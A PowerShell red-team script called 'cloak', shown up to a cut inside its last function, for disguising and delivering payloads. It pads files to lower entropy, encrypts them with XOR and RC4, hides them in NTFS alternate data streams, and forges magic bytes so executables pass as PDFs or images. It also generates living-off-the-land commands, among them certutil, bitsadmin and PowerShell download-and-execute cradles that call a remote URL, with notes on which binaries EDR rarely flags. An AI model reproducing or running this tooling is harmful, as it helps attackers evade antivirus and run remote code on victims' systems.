#Requires -Version 5.1
<#
.SYNOPSIS
    Red Team File Utility — Encoding + ADS + Entropy + Header Spoofing + Hashing + LOLBin Generator

.DESCRIPTION
    Two modes:

      1. Info  — Inspect a file: size, entropy, first-byte fingerprint, known magic-byte match.
      2. Util  — Encode, lower entropy, ADS read/write, rename extension, spoof header, show hashes.

    Encoding Techniques (interactive menu when -Encode is used in Info or Util)
    -------------------
    1  Base64
    2  Hex
    3  XOR        (key prompted)
    4  Reverse bytes
    5  XOR → Base64
    6  XOR → Hex
    7  RC4        (key prompted)

    ADS — Alternate Data Streams (NTFS only)
    -----------------------------------------
    -AdsWrite  <payload>   Write a file into carrier:stream
    -AdsRead               Read carrier:stream to -Output
    -AdsList               List all streams on -Carrier
    -AdsDelete             Delete carrier:stream
    -AdsStream <name>      Stream name (required for Write/Read/Delete)

.EXAMPLE
    # Inspect a file (includes entropy score)
    .\cloak.ps1 -Mode Info -Carrier payload.exe -ShowHashes

.EXAMPLE
    # RC4 encode
    .\cloak.ps1 -Mode Util -Carrier document.txt -Encode

.EXAMPLE
    # Lower entropy then encode then rename
    .\cloak.ps1 -Mode Util -Carrier payload.exe -LowerEntropy 6.0 -Encode -NewExtension ".pdf" -SpoofHeader

.EXAMPLE
    # Write payload into ADS
    .\cloak.ps1 -Mode Util -Carrier readme.txt -AdsWrite payload.enc -AdsStream hidden

.EXAMPLE
    # Read ADS stream back out
    .\cloak.ps1 -Mode Util -Carrier readme.txt -AdsRead -AdsStream hidden -Output recovered.bin

.EXAMPLE
    # List all ADS streams on a file
    .\cloak.ps1 -Mode Util -Carrier readme.txt -AdsList

.EXAMPLE
    # Delete an ADS stream
    .\cloak.ps1 -Mode Util -Carrier readme.txt -AdsDelete -AdsStream hidden

.NOTES
    For educational / research / CTF use.
#>

[CmdletBinding(SupportsShouldProcess)]
param(
    # ── Mode ────────────────────────────────────────────────────────────────
    [Parameter(Mandatory)]
    [ValidateSet('Info', 'Util', 'Generate')]
    [string] $Mode,

    # ── File params ──────────────────────────────────────────────────────────
    [string] $Carrier,
    [string] $Output,

    # ── Encoding / processing ────────────────────────────────────────────────
    [switch] $Encode,

    # Lower entropy: target Shannon entropy (e.g. 6.0). Applied before encoding.
    # Default -1 means disabled.
    [double] $LowerEntropy = -1,

    # ── Extension / header ───────────────────────────────────────────────────
    [string] $NewExtension,
    [string] $AddExtension,
    [switch] $SpoofHeader,

    # ── Output options ───────────────────────────────────────────────────────
    [switch] $ShowHashes,
    [switch] $Quiet,

    # ── LOLBin generator ────────────────────────────────────────────────────────
    [string] $LolBin,       # specific LOLBin name (optional — interactive menu if omitted)
    [string] $LolBinFile,   # local payload file path
    [string] $LolBinUrl,    # remote URL for download cradles
    [string] $LolBinArg,    # extra argument (e.g. DLL export name)
    [switch] $List,         # list all LOLBins and exit

    # ── ADS params (NTFS only) ───────────────────────────────────────────────
    [string] $AdsWrite,     # path to payload file to write into ADS
    [switch] $AdsRead,      # read ADS stream → -Output
    [switch] $AdsList,      # list all streams on -Carrier
    [switch] $AdsDelete,    # delete a named stream
    [string] $AdsStream     # stream name, e.g. 'hidden'
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

# ═══════════════════════════════════════════════════════════════════════════════
#  MAGIC BYTE MAP
# ═══════════════════════════════════════════════════════════════════════════════

$MagicBytes = @{
    ".pdf"    = [byte[]]@(0x25, 0x50, 0x44, 0x46)
    ".png"    = [byte[]]@(0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A)
    ".jpg"    = [byte[]]@(0xFF, 0xD8, 0xFF)
    ".jpeg"   = [byte[]]@(0xFF, 0xD8, 0xFF)
    ".gif"    = [byte[]]@(0x47, 0x49, 0x46, 0x38)
    ".zip"    = [byte[]]@(0x50, 0x4B, 0x03, 0x04)
    ".docx"   = [byte[]]@(0x50, 0x4B, 0x03, 0x04)
    ".xlsx"   = [byte[]]@(0x50, 0x4B, 0x03, 0x04)
    ".pptx"   = [byte[]]@(0x50, 0x4B, 0x03, 0x04)
    ".7z"     = [byte[]]@(0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C)
    ".gz"     = [byte[]]@(0x1F, 0x8B)
    ".bz2"    = [byte[]]@(0x42, 0x5A, 0x68)
    ".rar"    = [byte[]]@(0x52, 0x61, 0x72, 0x21, 0x1A, 0x07)
    ".exe"    = [byte[]]@(0x4D, 0x5A)
    ".dll"    = [byte[]]@(0x4D, 0x5A)
    ".elf"    = [byte[]]@(0x7F, 0x45, 0x4C, 0x46)
    ".mp3"    = [byte[]]@(0x49, 0x44, 0x33)
    ".mp4"    = [byte[]]@(0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70)
    ".wav"    = [byte[]]@(0x52, 0x49, 0x46, 0x46)
    ".bmp"    = [byte[]]@(0x42, 0x4D)
    ".ico"    = [byte[]]@(0x00, 0x00, 0x01, 0x00)
    ".xml"    = [byte[]]@(0x3C, 0x3F, 0x78, 0x6D, 0x6C)
    ".sqlite" = [byte[]]@(0x53, 0x51, 0x4C, 0x69, 0x74, 0x65, 0x20, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x20, 0x33)
    ".class"  = [byte[]]@(0xCA, 0xFE, 0xBA, 0xBE)
    ".dmg"    = [byte[]]@(0x78, 0x01, 0x73, 0x0D, 0x62, 0x62)
    ".iso"    = [byte[]]@(0x43, 0x44, 0x30, 0x30, 0x31)
}

# ═══════════════════════════════════════════════════════════════════════════════
#  SHARED HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

function Write-Banner {
    if ($Quiet) { return }
    Write-Host ""
    Write-Host "  ╔════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "  ║                   cloak                        ║" -ForegroundColor Cyan
    Write-Host "  ╚════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
}

function Get-FileBytes([string]$Path) {
    $r = Resolve-Path $Path -ErrorAction Stop
    return [System.IO.File]::ReadAllBytes($r)
}

function Write-FileBytes([string]$Path, [byte[]]$Bytes) {
    $dir = Split-Path $Path
    if ($dir -and -not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }
    [System.IO.File]::WriteAllBytes($Path, $Bytes)
}

function Format-Bytes([long]$n) {
    $units = 'B','KB','MB','GB','TB'
    $i = 0; $d = [double]$n
    while ($d -ge 1024 -and $i -lt ($units.Length - 1)) { $d /= 1024; $i++ }
    return '{0:N2} {1}' -f $d, $units[$i]
}

function Show-Hashes([string]$FilePath) {
    Write-Host ""
    Write-Host "  Hashes for: $FilePath" -ForegroundColor Cyan
    Write-Host "  MD5:    $(( Get-FileHash $FilePath -Algorithm MD5    ).Hash)"
    Write-Host "  SHA1:   $(( Get-FileHash $FilePath -Algorithm SHA1   ).Hash)"
    Write-Host "  SHA256: $(( Get-FileHash $FilePath -Algorithm SHA256 ).Hash)"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  ENTROPY
# ═══════════════════════════════════════════════════════════════════════════════

function Get-Entropy([byte[]]$Bytes) {
    if ($Bytes.Length -eq 0) { return 0.0 }
    $counts = @(0) * 256
    foreach ($b in $Bytes) { $counts[$b]++ }
    $n = $Bytes.Length; $entropy = 0.0
    foreach ($c in $counts) {
        if ($c -gt 0) {
            $p = $c / $n
            $entropy -= $p * [Math]::Log($p, 2)
        }
    }
    return [Math]::Round($entropy, 3)
}

# Structured low-entropy junk patterns — mirrors cloak.py
$JunkPatterns = @(
    [byte[]]( ,0x00 * 64 ),
    [byte[]]( ,0x20 * 64 ),
    [System.Text.Encoding]::ASCII.GetBytes("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),
    [byte[]]( @(0xFF,0xFE) * 32 ),
    [byte[]]( ,0x90 * 64 ),
    [System.Text.Encoding]::ASCII.GetBytes("Copyright (c) Microsoft Corporation. All rights reserved.       "),
    [System.Text.Encoding]::ASCII.GetBytes("This program cannot be run in DOS mode.                         "),
    [byte[]]( @(0x00,0xFF) * 32 )
)

function Invoke-LowerEntropy {
    param([byte[]]$Data, [double]$Target)

    $current = Get-Entropy $Data
    if ($current -le $Target) {
        Write-Host "[*] Entropy already $current — no padding needed." -ForegroundColor Cyan
        return $Data
    }

    Write-Host "[*] Current entropy : $current" -ForegroundColor Cyan
    Write-Host "[*] Target entropy  : $Target"  -ForegroundColor Cyan

    $result     = [System.Collections.Generic.List[byte]]::new()
    $result.AddRange($Data)
    $maxSize    = $Data.Length * 4
    $patternIdx = 0
    $iterations = 0

    while ((Get-Entropy $result.ToArray()) -gt $Target) {
        if ($result.Count -ge $maxSize) {
            Write-Host "  [~] Reached 4x size limit — stopping early." -ForegroundColor DarkYellow
            break
        }
        $block = $JunkPatterns[$patternIdx % $JunkPatterns.Count]
        $result.AddRange($block)
        $patternIdx++; $iterations++
    }

    $final   = $result.ToArray()
    $finalEn = Get-Entropy $final
    $added   = $final.Length - $Data.Length
    Write-Host "[+] Entropy reduced : $current → $finalEn" -ForegroundColor Green
    Write-Host "[+] Padding added   : $(Format-Bytes $added) ($iterations blocks)" -ForegroundColor Green
    return $final
}

# ═══════════════════════════════════════════════════════════════════════════════
#  RC4
# ═══════════════════════════════════════════════════════════════════════════════

function Invoke-RC4 {
    param([byte[]]$Data, [byte[]]$Key)
    $S = 0..255; $j = 0
    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $S[$i] + $Key[$i % $Key.Length]) % 256
        $S[$i], $S[$j] = $S[$j], $S[$i]
    }
    $i = 0; $j = 0
    $out = [byte[]]::new($Data.Length)
    for ($idx = 0; $idx -lt $Data.Length; $idx++) {
        $i = ($i + 1) % 256
        $j = ($j + $S[$i]) % 256
        $S[$i], $S[$j] = $S[$j], $S[$i]
        $out[$idx] = $Data[$idx] -bxor $S[($S[$i] + $S[$j]) % 256]
    }
    return $out
}

function Read-RC4Key {
    $raw = (Read-Host "  RC4 key (string or hex e.g. 0xDEADBEEF)").Trim()
    if ($raw -match '^0x([0-9A-Fa-f]+)$') {
        $hex = $Matches[1]
        if ($hex.Length % 2) { $hex = "0$hex" }
        $keyBytes = [byte[]]::new($hex.Length / 2)
        for ($i = 0; $i -lt $keyBytes.Length; $i++) {
            $keyBytes[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16)
        }
        return $keyBytes
    }
    return [System.Text.Encoding]::UTF8.GetBytes($raw)
}

# ═══════════════════════════════════════════════════════════════════════════════
#  MAGIC BYTE SPOOFING
# ═══════════════════════════════════════════════════════════════════════════════

function Set-MagicBytes {
    param([string]$FilePath, [string]$Extension)
    $magic = $MagicBytes[$Extension.ToLower()]
    if (-not $magic) {
        Write-Host "  [!] No magic bytes defined for '$Extension' — header unchanged." -ForegroundColor DarkYellow
        return
    }
    $bytes = [System.IO.File]::ReadAllBytes($FilePath)
    if ($bytes.Length -lt $magic.Length) {
        Write-Warning "File smaller than magic sequence — padding with nulls."
        $bytes = $bytes + (New-Object byte[] ($magic.Length - $bytes.Length))
    }
    for ($i = 0; $i -lt $magic.Length; $i++) { $bytes[$i] = $magic[$i] }
    [System.IO.File]::WriteAllBytes($FilePath, $bytes)
    Write-Host "  [+] Magic bytes set for '$Extension': $($magic | ForEach-Object { '0x{0:X2}' -f $_ })" -ForegroundColor Green
}

# ═══════════════════════════════════════════════════════════════════════════════
#  ENCODING MENU
# ═══════════════════════════════════════════════════════════════════════════════

function Invoke-EncodingMenu {
    param([string]$FilePath)

    Write-Host ""
    Write-Host "  ┌───────────────────────────────┐" -ForegroundColor Magenta
    Write-Host "  │     Encoding Techniques       │" -ForegroundColor Magenta
    Write-Host "  ├───────────────────────────────┤" -ForegroundColor Magenta
    Write-Host "  │  [1] Base64                   │" -ForegroundColor Magenta
    Write-Host "  │  [2] Hex                      │" -ForegroundColor Magenta
    Write-Host "  │  [3] XOR  (key prompted)      │" -ForegroundColor Magenta
    Write-Host "  │  [4] Reverse bytes            │" -ForegroundColor Magenta
    Write-Host "  │  [5] XOR → Base64             │" -ForegroundColor Magenta
    Write-Host "  │  [6] XOR → Hex                │" -ForegroundColor Magenta
    Write-Host "  │  [7] RC4  (key prompted)      │" -ForegroundColor Magenta
    Write-Host "  └───────────────────────────────┘" -ForegroundColor Magenta
    $choice = Read-Host "  Select technique [1-7]"

    $bytes = [System.IO.File]::ReadAllBytes($FilePath)
    $encoded  = $null
    $isBinary = $false

    switch ($choice) {
        "1" {
            $encoded = [Convert]::ToBase64String($bytes)
            Write-Host "  [+] Base64 encoding applied." -ForegroundColor Green
        }
        "2" {
            $encoded = ($bytes | ForEach-Object { '{0:X2}' -f $_ }) -join ''
            Write-Host "  [+] Hex encoding applied." -ForegroundColor Green
        }
        "3" {
            $keyInput = Read-Host "  XOR key (hex e.g. 0x41 or decimal e.g. 65)"
            $key      = if ($keyInput -match '^0x') { [Convert]::ToByte($keyInput, 16) } else { [byte]$keyInput }
            $encoded  = [byte[]]($bytes | ForEach-Object { $_ -bxor $key })
            $isBinary = $true
            Write-Host "  [+] XOR applied (key 0x$( '{0:X2}' -f $key ))." -ForegroundColor Green
        }
        "4" {
            [Array]::Reverse($bytes)
            $encoded  = $bytes
            $isBinary = $true
            Write-Host "  [+] Byte order reversed." -ForegroundColor Green
        }
        "5" {
            $keyInput = Read-Host "  XOR key (hex e.g. 0x41 or decimal e.g. 65)"
            $key      = if ($keyInput -match '^0x') { [Convert]::ToByte($keyInput, 16) } else { [byte]$keyInput }
            $xored    = [byte[]]($bytes | ForEach-Object { $_ -bxor $key })
            $encoded  = [Convert]::ToBase64String($xored)
            Write-Host "  [+] XOR (0x$( '{0:X2}' -f $key )) → Base64 applied." -ForegroundColor Green
        }
        "6" {
            $keyInput = Read-Host "  XOR key (hex e.g. 0x41 or decimal e.g. 65)"
            $key      = if ($keyInput -match '^0x') { [Convert]::ToByte($keyInput, 16) } else { [byte]$keyInput }
            $xored    = $bytes | ForEach-Object { $_ -bxor $key }
            $encoded  = ($xored | ForEach-Object { '{0:X2}' -f $_ }) -join ''
            Write-Host "  [+] XOR (0x$( '{0:X2}' -f $key )) → Hex applied." -ForegroundColor Green
        }
        "7" {
            $key      = Read-RC4Key
            $encoded  = Invoke-RC4 -Data $bytes -Key $key
            $isBinary = $true
            Write-Host "  [+] RC4 applied (key length $($key.Length) bytes)." -ForegroundColor Green
        }
        default {
            Write-Warning "Invalid selection — no encoding applied."
            return $FilePath
        }
    }

    $out = "$FilePath.enc"
    if ($isBinary) { Write-FileBytes $out ([byte[]]$encoded) }
    else           { [System.IO.File]::WriteAllText($out, $encoded) }

    Write-Host "  [+] Encoded file saved → $out" -ForegroundColor Yellow
    return $out
}

# ═══════════════════════════════════════════════════════════════════════════════
#  ADS — ALTERNATE DATA STREAMS
# ═══════════════════════════════════════════════════════════════════════════════

function Invoke-AdsWrite {
    param([string]$CarrierPath, [string]$StreamName, [string]$PayloadPath)
    $payload = Get-FileBytes $PayloadPath
    $adsPath = "${CarrierPath}:${StreamName}"
    $fs      = [System.IO.File]::OpenWrite($adsPath)
    $fs.Write($payload, 0, $payload.Length)
    $fs.Close()
    Write-Host "[+] Stream written  : $adsPath  ($(Format-Bytes $payload.Length))" -ForegroundColor Green
    Write-Host "[*] Tip: visible only via  dir /r  or  Get-Item -Stream *" -ForegroundColor Cyan
}

function Invoke-AdsRead {
    param([string]$CarrierPath, [string]$StreamName, [string]$OutputPath)
    $adsPath = "${CarrierPath}:${StreamName}"
    $check   = Get-Item -Path $CarrierPath -Stream $StreamName -ErrorAction SilentlyContinue
    if (-not $check) {
        throw "Stream '$StreamName' not found on '$CarrierPath'. Use -AdsList to see available streams."
    }
    $fs  = [System.IO.File]::OpenRead($adsPath)
    $ms  = [System.IO.MemoryStream]::new()
    $fs.CopyTo($ms); $fs.Close()
    $data = $ms.ToArray()
    Write-FileBytes $OutputPath $data
    Write-Host "[+] Stream read     : $adsPath  ($(Format-Bytes $data.Length))" -ForegroundColor Green
    Write-Host "[+] Written to      : $OutputPath" -ForegroundColor Green
}

function Invoke-AdsList {
    param([string]$CarrierPath)
    $streams = Get-Item -Path $CarrierPath -Stream * -ErrorAction Stop
    Write-Host ""
    Write-Host "  ADS streams on: $CarrierPath" -ForegroundColor Cyan
    $streams | Format-Table Stream, Length -AutoSize | Out-Host
}

function Invoke-AdsDelete {
    param([string]$CarrierPath, [string]$StreamName)
    Remove-Item -Path $CarrierPath -Stream $StreamName -ErrorAction Stop
    Write-Host "[+] Stream deleted  : ${CarrierPath}:${StreamName}" -ForegroundColor Green
}

# ═══════════════════════════════════════════════════════════════════════════════
#  INFO
# ═══════════════════════════════════════════════════════════════════════════════

function Invoke-Info {
    param([string]$FilePath)
    $bytes = Get-FileBytes $FilePath

    Write-Host "[*] File           : $FilePath" -ForegroundColor Cyan
    Write-Host "[*] Size           : $(Format-Bytes $bytes.Length) ($($bytes.Length) bytes)" -ForegroundColor Cyan

    # Entropy
    $entropy = Get-Entropy $bytes
    $label   = if ($entropy -lt 6.5)  { "low — looks benign" }
               elseif ($entropy -lt 7.2) { "medium — mildly suspicious" }
               else { "high — likely packed/encrypted" }
    $color   = if ($entropy -lt 6.5) { "Green" } elseif ($entropy -lt 7.2) { "Yellow" } else { "Red" }
    Write-Host "[*] Entropy        : $entropy / 8.0  ($label)" -ForegroundColor $color

    # First 16 bytes
    $preview    = $bytes[0..([Math]::Min(15, $bytes.Length - 1))]
    $hexPreview = ($preview | ForEach-Object { '{0:X2}' -f $_ }) -join ' '
    Write-Host "[*] First 16 bytes : $hexPreview" -ForegroundColor Cyan

    # Magic byte match
    $matched = @()
    foreach ($entry in $MagicBytes.GetEnumerator()) {
        $magic = $entry.Value
        if ($bytes.Length -ge $magic.Length) {
            $match = $true
            for ($i = 0; $i -lt $magic.Length; $i++) {
                if ($bytes[$i] -ne $magic[$i]) { $match = $false; break }
            }
            if ($match) { $matched += $entry.Key }
        }
    }
    if ($matched.Count -gt 0) {
        Write-Host "[+] Header matches known format(s): $($matched -join ', ')" -ForegroundColor Green
    } else {
        Write-Host "[~] Header does not match any known magic bytes in the map." -ForegroundColor DarkYellow
    }
}

# ═══════════════════════════════════════════════════════════════════════════════
#  POST-PROCESSING  (entropy → encode → rename → spoof → hashes → cleanup)
# ═══════════════════════════════════════════════════════════════════════════════

function Invoke-PostProcess {
    param(
        [string]   $WorkFile,
        [string[]] $ProtectedFiles = @()
    )

    $temps = [System.Collections.Generic.List[string]]::new()

    # 1. Entropy reduction
    if ($LowerEntropy -ge 0) {
        $data    = Get-FileBytes $WorkFile
        $padded  = Invoke-LowerEntropy -Data $data -Target $LowerEntropy
        $outPath = "$WorkFile.padded"
        Write-FileBytes $outPath $padded
        Write-Host "  [+] Padded file saved → $outPath" -ForegroundColor Green
        $temps.Add([System.IO.Path]::GetFullPath($outPath))
        $WorkFile = $outPath
    }

    # 2. Encoding (interactive menu)
    if ($Encode) {
        $prev     = $WorkFile
        $WorkFile = Invoke-EncodingMenu -FilePath $WorkFile
        $resolvedPrev = (Resolve-Path $prev).Path
        $resolvedCurr = [System.IO.Path]::GetFullPath($WorkFile)
        if ($resolvedPrev -ne $resolvedCurr) { $temps.Add($resolvedCurr) }
    }

    # 3. NewExtension — replaces ALL existing extensions
    if ($NewExtension) {
        $dir      = [System.IO.Path]::GetDirectoryName($WorkFile)
        $baseName = [System.IO.Path]::GetFileName($WorkFile)
        while ([System.IO.Path]::HasExtension($baseName)) {
            $baseName = [System.IO.Path]::GetFileNameWithoutExtension($baseName)
        }
        $ext     = if ($NewExtension.StartsWith('.')) { $NewExtension } else { ".$NewExtension" }
        $newName = if ($dir) { [System.IO.Path]::Combine($dir, "$baseName$ext") } else { "$baseName$ext" }

        $resolvedWork = (Resolve-Path $WorkFile).Path
        $resolvedNew  = [System.IO.Path]::GetFullPath($newName)
        if ($resolvedWork -ne $resolvedNew) {
            Copy-Item $WorkFile $newName -Force
            Write-Host "  [+] Extension replaced → $newName" -ForegroundColor Green
            if ($temps.Contains($resolvedWork)) {
                $null = $temps.Remove($resolvedWork); $temps.Add($resolvedWork)
            }
        } else {
            Write-Host "  [~] Output already has target extension, skipping rename." -ForegroundColor DarkYellow
        }
        if ($SpoofHeader) { Set-MagicBytes -FilePath $newName -Extension $ext }
        $WorkFile = $newName
    }

    # 4. AddExtension — appends to existing filename
    if ($AddExtension) {
        $ext     = if ($AddExtension.StartsWith('.')) { $AddExtension } else { ".$AddExtension" }
        $newName = "$WorkFile$ext"
        $resolvedWork = (Resolve-Path $WorkFile).Path
        $resolvedNew  = [System.IO.Path]::GetFullPath($newName)
        if ($resolvedWork -ne $resolvedNew) {
            Copy-Item $WorkFile $newName -Force
            Write-Host "  [+] Extension appended → $newName" -ForegroundColor Green
            if ($temps.Contains($resolvedWork)) {
                $null = $temps.Remove($resolvedWork); $temps.Add($resolvedWork)
            }
        } else {
            Write-Host "  [~] File already has that appended extension, skipping." -ForegroundColor DarkYellow
        }
        if ($SpoofHeader) { Set-MagicBytes -FilePath $newName -Extension $ext }
        $WorkFile = $newName
    }

    # 5. Hashes
    if ($ShowHashes) { Show-Hashes $WorkFile }

    # 6. Cleanup temps — never delete originals or final output
    $finalResolved = [System.IO.Path]::GetFullPath($WorkFile)
    foreach ($tmp in $temps) {
        $tmpResolved = [System.IO.Path]::GetFullPath($tmp)
        $isProtected = $ProtectedFiles | Where-Object { [System.IO.Path]::GetFullPath($_) -eq $tmpResolved }
        if ($tmpResolved -ne $finalResolved -and -not $isProtected -and (Test-Path $tmpResolved)) {
            Remove-Item $tmpResolved -Force
            Write-Host "  [~] Cleaned up temp file: $tmp" -ForegroundColor DarkGray
        }
    }

    return $WorkFile
}


# ═══════════════════════════════════════════════════════════════════════════════
#  LOLBIN GENERATOR
# ═══════════════════════════════════════════════════════════════════════════════

$LolBinDB = [ordered]@{
    rundll32    = @{ Desc='Execute DLL export or scriptlet via COM';                        OS='All Windows';                                    Note='Heavily monitored — combine with obfuscation';                              Types=@('.dll','.sct','.hta') }
    regsvr32    = @{ Desc='Register/execute DLL or remote scriptlet (squiblydoo)';         OS='All Windows';                                    Note='Classic AppLocker bypass — ASR rules may block on Defender ATP';            Types=@('.dll','.sct') }
    mshta       = @{ Desc='Execute HTA application — bypasses AppLocker';                  OS='All Windows';                                    Note='Often blocked by ASR rules in Defender ATP';                                Types=@('.hta','.sct','.vbs') }
    wmic        = @{ Desc='Execute XSL transform or process creation';                     OS='REMOVED in Win 11 22H2+ / Server 2025';          Note='Still works on Win 10, Server 2016/2019/2022';                              Types=@('.xsl','.exe','.sct') }
    certutil    = @{ Desc='Download file, decode Base64/hex, or execute';                  OS='All Windows';                                    Note='Network to non-cert URLs flagged by many EDRs';                             Types=@('*') }
    bitsadmin   = @{ Desc='Background download via BITS service';                          OS='All Windows (deprecated but present)';           Note='Deprecated since Win 7';                                                    Types=@('*') }
    powershell  = @{ Desc='Download cradles and execution one-liners';                     OS='All Windows';                                    Note='ScriptBlock logging + AMSI active on Win 10+. Use -enc and obfuscation';    Types=@('*','.ps1','.exe','.dll') }
    msiexec     = @{ Desc='Install/execute MSI package locally or from URL';               OS='All Windows';                                    Note='UAC prompt possible without /quiet flag';                                    Types=@('.msi') }
    odbcconf    = @{ Desc='Execute DLL via ODBC config action';                            OS='All Windows';                                    Note='Very low detection. DLL must export DllRegisterServer';                     Types=@('.dll','.rsp') }
    ieexec      = @{ Desc='Download and execute via IE engine';                            OS='REMOVED in Win 11 — requires Internet Explorer'; Note='Works on Win 10 and earlier only';                                          Types=@('*') }
    cmstp       = @{ Desc='Execute INF — UAC bypass + AppLocker bypass';                   OS='All Windows';                                    Note='UAC bypass patched in some builds. Execution still works';                   Types=@('.inf') }
    cscript     = @{ Desc='Execute script files';                                          OS='All Windows';                                    Note='WSH may be disabled via GPO in hardened environments';                      Types=@('.vbs','.js','.wsf') }
    wscript     = @{ Desc='Execute script files (GUI host)';                               OS='All Windows';                                    Note='WSH may be disabled via GPO in hardened environments';                      Types=@('.vbs','.js','.wsf') }
    installutil = @{ Desc='Execute .NET assembly — bypasses AppLocker';                    OS='All Windows with .NET Framework';                Note='Assembly must implement System.Configuration.Install.Installer';             Types=@('.exe','.dll') }
    regasm      = @{ Desc='Execute .NET assembly via COM registration';                    OS='All Windows with .NET Framework';                Note='Low detection. DLL needs COM-registerable class';                           Types=@('.dll') }
    regsvcs     = @{ Desc='Execute .NET DLL via COM+ Services';                            OS='All Windows with .NET Framework';                Note='Similar to regasm — requires COM+ compatible DLL';                          Types=@('.dll') }
    forfiles    = @{ Desc='Execute command via file search — cmd bypass';                  OS='All Windows';                                    Note='Good when cmd.exe is restricted. Very low monitoring';                      Types=@('*') }
    pcalua      = @{ Desc='Execute via Program Compatibility Assistant';                   OS='All Windows';                                    Note='Very low detection — rarely in EDR rule sets';                              Types=@('*') }
}

function Get-B64PS([string]$s) {
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($s)
    return [Convert]::ToBase64String($bytes)
}

function Get-LolBinCommands {
    param([string]$Name, [string]$File, [string]$Url, [string]$Arg, [string]$Ext)

    $f = if ($File) { $File } else { if ($Url) { [System.IO.Path]::GetFileName($Url.Split('?')[0]) } else { 'payload' } }
    $u = if ($Url)  { $Url }  else { 'http://host/payload' }
    $a = if ($Arg)  { $Arg }  else { 'EntryPoint' }

    switch ($Name.ToLower()) {
        'rundll32' {
            switch ($Ext) {
                '.dll' { return @(
                    "rundll32.exe $f,$a",
                    "rundll32.exe javascript:`"\..\mshtml,RunHTMLApplication `";document.write();GetObject(`"script:$f`")"
                )}
                '.sct' { return @(
                    "rundll32.exe javascript:`"\..\mshtml,RunHTMLApplication `";GetObject(`"script:$f`")"
                )}
                '.hta' { return @(
                    "rundll32.exe javascript:`"\..\mshtml,RunHTMLApplication `";document.write();new%20ActiveXObject(`"WScript.Shell`").Run(`"$f`")"
                )}
                default { return @("rundll32.exe $f,$a") }
            }
        }
        'regsvr32' {
            switch ($Ext) {
                '.dll' { return @("regsvr32.exe /s $f", "regsvr32.exe /s /u $f") }
                '.sct' { return @(
                    "regsvr32.exe /s /n /u /i:$f scrobj.dll",
                    "regsvr32.exe /s /n /u /i:$u scrobj.dll"
                )}
                default { return @("regsvr32.exe /s /n /u /i:$u scrobj.dll") }
            }
        }
        'mshta' {
            return @(
                "mshta.exe $f",
                "mshta.exe `"$u`"",
                "mshta vbscript:Execute(`"CreateObject(`"`"Wscript.Shell`"`").Run `"`"$f`"`":close`")"
            )
        }
        'wmic' {
            switch ($Ext) {
                '.xsl' { return @(
                    "wmic process get brief /format:`"$f`"",
                    "wmic process get brief /format:`"$u`"",
                    "wmic os get /format:`"$f`""
                )}
                '.exe' { return @(
                    "wmic process call create `"$f`"",
                    "wmic /node:127.0.0.1 process call create `"$f`""
                )}
                default { return @("wmic process get brief /format:`"$u`"") }
            }
        }
        'certutil' {
            return @(
                "certutil.exe -urlcache -split -f `"$u`" $f",
                "certutil.exe -decode $f output.exe",
                "certutil.exe -decodehex $f output.exe",
                "certutil.exe -verifyctl -f -split `"$u`""
            )
        }
        'bitsadmin' {
            return @(
                "bitsadmin /transfer job /download /priority high `"$u`" `"%TEMP%\$([System.IO.Path]::GetFileName($f))`"",
                "bitsadmin /transfer job `"$u`" %TEMP%\$([System.IO.Path]::GetFileName($f)) & bitsadmin /complete job"
            )
        }
        'powershell' {
            $cradle1 = "IEX(New-Object Net.WebClient).DownloadString('$u')"
            $enc     = Get-B64PS "IEX(irm '$u')"
            switch ($Ext) {
                '.ps1' { return @(
                    "powershell -ep bypass -nop -w hidden -f `"$f`"",
                    "powershell -ep bypass -nop -c `"& '$f'`""
                )}
                '.exe' { return @(
                    "powershell -ep bypass -c `"Start-Process '$f'`"",
                    "powershell -ep bypass -c `"[Diagnostics.Process]::Start('$f')`""
                )}
                default { return @(
                    "powershell -ep bypass -nop -w hidden -c `"$cradle1`"",
                    "powershell -ep bypass -nop -enc $enc",
                    "powershell -ep bypass -c `"(New-Object Net.WebClient).DownloadFile('$u','$f')`"",
                    "powershell -ep bypass -c `"& {`$d=(New-Object Net.WebClient).DownloadData('$u');[IO.File]::WriteAllBytes('$f',`$d)}`""
                )}
            }
        }
        'msiexec' {
            return @(
                "msiexec /quiet /i $f",
                "msiexec /quiet /i `"$u`"",
                "msiexec /q /i $f TRANSFORMS=evil.mst"
            )
        }
        'odbcconf' {
            switch ($Ext) {
                '.dll' { return @("odbcconf.exe /a {REGSVR $f}", "odbcconf.exe /s /a {REGSVR $f}") }
                '.rsp' { return @("odbcconf.exe /f $f") }
                default { return @("odbcconf.exe /a {REGSVR $f}") }
            }
        }
        'ieexec'      { return @("ieexec.exe $u") }
        'cmstp'       { return @("cmstp.exe /s /ns $f", "cmstp.exe /au $f") }
        'cscript'     { return @("cscript.exe //nologo $f") }
        'wscript'     { return @("wscript.exe //nologo $f") }
        'installutil' { return @(
            "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $f",
            "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $f"
        )}
        'regasm'  { return @("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U $f") }
        'regsvcs' { return @("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe $f") }
        'forfiles' { return @(
            "forfiles /p C:\Windows\System32 /m notepad.exe /c `"$f`"",
            "forfiles /p C:\Windows\System32 /m calc.exe /c `"cmd /c $f`""
        )}
        'pcalua'  { return @("pcalua.exe -a $f", "pcalua.exe -a $f -d C:\Windows\System32") }
        default   { throw "Unknown LOLBin: $Name" }
    }
}

function Invoke-Generate {
